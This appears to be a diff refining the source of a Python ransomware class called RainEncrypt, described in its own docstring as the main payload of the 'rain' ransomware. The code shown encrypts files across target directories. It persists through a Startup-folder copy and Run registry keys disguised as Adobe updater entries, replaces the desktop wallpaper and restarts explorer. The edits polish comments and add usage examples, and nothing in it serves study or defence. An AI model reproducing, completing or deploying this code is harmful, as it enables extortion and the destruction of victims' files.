@@ -10,7 +10,12 @@ from .core.directory_iter import DirectoryIter
 class RainEncrypt:
     """
     Class executes the main bulk of the rain ransom-wares payload, I believe the extra
-    utc and av disabling functionality is in bat files but can be ported
+    utc and av disabling functionality are in bat files but can be ported
+
+    Example Usage:
+
+        RainEncrypt().do_final()
+
     """
     __APPDATA = getenv('APPDATA')
     __EXT = (i.replace("*", "") for i in
@@ -38,7 +43,7 @@ class RainEncrypt:
         Windows only function
 
         Not entirely sure on the logic here and why the need for 3 start up locations
-        just copied it from your original code and removed a copy to documents
+        I copied it from your original code and removed a copy to documents
 
         :param self_file_name: file to stat up at logon
         """
@@ -47,10 +52,11 @@ class RainEncrypt:
         copyfile(self_file_name,
                  self.__APPDATA + r'\Microsoft\Windows\Start Menu\Programs\Startup\AdobeAAMCCUpdater.exe')
         try:
+            # this will start up for all users, not recommended unless shared folders such as ProgramFiles are targeted
             key = CreateKey(HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run')  # privileged request
         except PermissionError:
-            # in case program is not admin startup will only run for current user this makes more sense
-            # as only the current users docs, desktop, etc are being downloaded
+            # in case program is not admin, startup will only run for current user this makes more sense
+            # as only the current users docs, desktop, etc are encrypted
             key = CreateKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
 
         SetValueEx(key, "AdobeAAM", 0, REG_SZ, 'C:\\Users\\Public\\AdobeAAMUpdater.exe')
@@ -59,7 +65,8 @@ class RainEncrypt:
 
     def __set_back_ground_windows(self, bg: bytes):
         open("bg.jpg", 'wb').write(bg)
-        copyfile("bg.jpg", self.__APPDATA + "\\Microsoft\\Windows\\Themes" + "\\TranscodedWallpaper")
+        copyfile("bg.jpg",
+                 self.__APPDATA + "\\Microsoft\\Windows\\Themes\\TranscodedWallpaper")  # not sure if this correct
 
         # refresh explorer
         system("taskkill /f /IM explorer.exe")
@@ -67,7 +74,7 @@ class RainEncrypt:
 
     def __infect_all(self):
         """
-        walk directories directories specified in self.paths and encrypt files
+        Walk directories directories specified in self.paths and encrypt files
         """
         for path_ in self.paths:
             for file in DirectoryIter(path_).iter_files(path_):
@@ -86,15 +93,15 @@ class RainEncrypt:
     def do_final(self, to_run_at_startup=str()):
         """
         Consider this the entry point, will encrypt target files
-        then change background and adds startup entry (depending on platform)
+        then change background and adds startup entries (depending on platform)
         """
         self.__infect_all()  # encrypt all target location works for both windows an linux
-        self.crypto.dump_key()  # dumps aes key seed password to disk (required for decrypt)
+        self.crypto.dump_key()  # dumps aes password to disk (required for decrypt)
         del self.crypto  # delete encryption object (helps keep keys out of memory but not reliable)
 
         if platform.system() == "windows":  # windows only functions
 
-            if to_run_at_startup:
+            if to_run_at_startup:  # if a startup path was specified
                 self.__enable_run_at_start_windows(to_run_at_startup)  # run another path at startup e.g. gui
 
             self.__set_back_ground_windows(open("bg.jpg", "rb").read())  # replace background
